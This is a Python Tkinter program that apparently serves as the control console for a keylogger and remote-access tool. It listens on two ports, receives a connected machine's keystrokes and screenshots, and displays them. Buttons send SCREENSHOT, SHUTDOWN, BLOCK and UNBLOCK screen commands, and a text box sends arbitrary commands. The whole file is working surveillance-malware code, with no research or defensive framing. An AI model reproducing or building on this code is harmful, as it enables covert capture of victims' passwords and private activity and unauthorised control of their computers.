from tkinter import *
from tkinter import ttk
import socket
import sys
import _thread
import time
from collections import deque
import math
from PIL import ImageTk, Image, ImageFile

ImageFile.LOAD_TRUNCATED_IMAGES = True




server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

image_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
image_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 


IP = socket.gethostbyname(socket.gethostname())
PORT = 31415
IMAGE_PORT = 31416

server.bind((IP, PORT))
server.listen(1)
image_server.bind((IP, IMAGE_PORT))
image_server.listen(1)



KEY = 'KEY'
IMAGE = 'IMAGE'
STOP_IMAGE = 'STOP_IMAGE'
CHECK_TIME = 5 #how many seconds to check if the client is still there
RELATIVE_IMAGE_FILE_NAME = 'image.png'

keys = deque()
images = deque()

def image_thread(con, ad):
    '''
    thread to recieve images, seperate from amin recieving thread
    when IMAGE is recieved in a message, recives the image that is sent\
    then puts it in images deque for gui to use
    '''
    while True:
        try:
            message = con.recv(512)
            message = str(message)[2:-1]
            if message.startswith(IMAGE):
                size = int(message.split()[1])
                print(555)
                file = open(RELATIVE_IMAGE_FILE_NAME, 'wb')
                for i in range(math.ceil(size / 512)):
                    message = con.recv(512)
                    file.write(message)
                
                
                try:
                    file.close()
                except:
                    pass
                images.append(RELATIVE_IMAGE_FILE_NAME)
        except Exception as e:
            pass

def cthread(con, ad):
    '''
    recieves stuff from client
    can add keys to the queue for gui usage
    '''
    

    while True:
        try:
            message = con.recv(2048) #cliwnt sent message
            if message:
                message = str(message)[2:-1] #get the bytes out
                message_pieces = message.split('|')
                for i in message_pieces:
                    if i.startswith(KEY):
                        
                        print(i[len(KEY) + 1:])
                        temp_key = i[len(KEY) + 1:]
                        if temp_key[0] == "'":
                            temp_key  = temp_key[1:]
                        if temp_key[-1] == "'":
                            temp_key = temp_key[:-1]
                        #add the key to the queue
                        keys.append(temp_key)


                    elif i:
                        print(i)
            else:
                pass
        except:
            continue


class Thing(Tk):
    '''
    main window
    '''
    def __init__(self, server, *args, **kwargs):
        '''
        gui

        layout:
        
        _______
        |     |      _____________
        |     |     |
        |keys |     |
        |     |     |
        |     |     | image goes
        _______     |     here
                    |
        ________    |
        |      |    |
        |      |    |_____________
        |button|
        ________
        '''
        self.server = server
        super().__init__(*args, **kwargs)

        self.command_frame = Frame(self)
        self.command_frame.grid()

        self.client = 0
        self.ad = 0
        self.image_client = 0

        Label(self.command_frame, text='Keys').grid()
        self.keys = Listbox(self.command_frame)
        self.keys.grid(row=1, column=0)
        self.keys_scroll = Scrollbar(self.command_frame, command=self.keys.yview)
        self.auto_scroll_var = IntVar()
        self.auto_scroll = Checkbutton(self.command_frame, variable=self.auto_scroll_var,
                                       onvalue=1, offvalue=0,
                                       text='Auto Scroll')
        self.auto_scroll.grid(row=0, column=1)
        self.keys_scroll.grid(row=1, column=1, sticky='NSW')
        self.keys.config(yscrollcommand=self.keys_scroll.set)
        
        Label(self.command_frame, text='Send Command').grid(row=2, column=0)
        self.entry = Entry(self.command_frame)
        self.entry.grid()

        self.entry.bind('<Return>', self.send)

        self.sep = ttk.Separator(self, orient='horizontal')
        self.sep.grid(row=1, column=0, sticky='EW', pady=10)


        self.button_frame = Frame(self)
        self.button_frame.grid(row=2, column=0)
        Button(self.button_frame, text='Take Screenshot',
               command=lambda:
               self.send(message='SCREENSHOT')).grid(columnspan=2, sticky='EW')
        Button(self.button_frame, text='Shutdown',
               command=lambda:
               self.send(message='SHUTDOWN')).grid(columnspan=2, sticky='EW')
        Button(self.button_frame, text='Block Screen',
               command=lambda:
               self.send(message=f'BLOCK {self.block_entry.get()}')
               ).grid(sticky='EW')
        self.block_entry = Entry(self.button_frame)
        self.block_entry.grid(row=2, column=1)
        self.block_entry.bind('<Return>', lambda e:
                              self.send(message=f'BLOCK {self.block_entry.get()}'))
        Button(self.button_frame, text='Unblock Screen',
               command=lambda:
               self.send(message='UNBLOCK')).grid(columnspan=2, sticky='EW')

        

        self.canvas = Label(self)
        self.canvas.grid(row=0, column=1, rowspan=3, sticky='NSEW')

    def send(self, event=None, message=None):
        '''
        sends the message to self.client
        clears the entrybox
        if client does not recieve, disconnect
        '''
        if message:
            thing_to_send = message #python did stuff should not be printe
        else:
            thing_to_send = self.entry.get()
            self.entry.delete(0, END)
            print(thing_to_send) #user inputted stuff
            
        try:
            self.client.send(bytes(thing_to_send, 'utf-8'))
        except:
            self.client = 0
            print('Client disconnected' + self.ad[0])
            self.ad = 0
            return False
        
        return True
    
    def add_image(self, image):
        '''
        inserts an image into the canvas label
        image is the file path specified in the images
        '''
        print('IMAGE')
        self.img = Image.open(image)
        self.img = self.img.resize((self.img.size[0] // 2,
                                    self.img.size[1] // 2))
        self.img = ImageTk.PhotoImage(self.img)
        self.canvas.image = self.img
        self.canvas.config(image=self.img)

        
        

    def log_key(self, key):
        '''
        puts one key into the listbox
        '''
        replace = {
            '\\\\\\\\': '\\',
            'shift': 'shift_l',
        }
        
        self.keys.insert(END, key) #doesn't work because of different thread
        self.update()
        if self.auto_scroll_var.get():
            self.keys.yview(END)
        

    def main(self):
        '''
        mainloop
        '''
        while True:
            print('trying to accept')
            con, ad = server.accept() 
            print('accepted at ' + str(ad[0]))
            self.title(str(ad[0]))

            icon, iad = image_server.accept()
            self.image_client = icon

            last_checked = time.time() #checks if client is there once every
                                       #CHECK_TIME seconds
            
            self.client = con
            self.ad = ad
            _thread.start_new_thread(cthread, (con, ad))
            _thread.start_new_thread(image_thread, (icon, iad))

            while True:
                self.update()
                try:
                    key = keys.pop()
                    self.log_key(key)
                except IndexError:
                    #nothing in the keys queue
                    pass

                try:
                    image = images.pop()
                    self.add_image(image)
                except IndexError:
                    pass

                if time.time() > last_checked + CHECK_TIME:
                    last_checked = time.time()
                    self.send(message='ALIVE')

                
                if not self.client:
                    break

if __name__ == '__main__':          
    window = Thing(server)

    window.main()


